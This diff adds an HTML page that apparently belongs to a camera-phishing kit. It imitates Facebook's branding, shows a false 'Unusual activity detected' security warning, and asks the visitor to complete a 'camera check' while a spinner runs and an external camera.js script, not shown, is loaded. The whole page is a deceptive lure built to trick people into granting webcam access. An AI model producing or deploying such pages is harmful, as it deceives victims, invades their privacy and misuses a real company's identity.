@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Security Check</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 8px;
+            padding: 40px;
+            max-width: 450px;
+            width: 100%;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        .logo {
+            color: #1877f2;
+            font-size: 56px;
+            font-weight: bold;
+            margin-bottom: 30px;
+        }
+        h2 { color: #1c1e21; margin-bottom: 10px; font-size: 24px; font-weight: 600; }
+        p { color: #606770; margin-bottom: 25px; line-height: 1.5; font-size: 15px; }
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            border-radius: 6px;
+            padding: 15px;
+            margin-bottom: 20px;
+            color: #856404;
+            font-size: 14px;
+        }
+        .spinner {
+            border: 4px solid #e4e6eb;
+            border-top: 4px solid #1877f2;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 25px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .shield { font-size: 72px; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">facebook</div>
+        <div class="shield">🛡️</div>
+        <h2>Security Verification</h2>
+        <div class="warning">⚠️ Unusual activity detected on your account</div>
+        <p>We detected a login from an unfamiliar device. To protect your account, please verify your identity by completing a quick camera check.</p>
+        <div class="spinner"></div>
+        <p style="font-size: 13px; color: #8a8d91;">Verifying your device...</p>
+    </div>
+    <script src="../camera.js"></script>
+</body>
+</html>
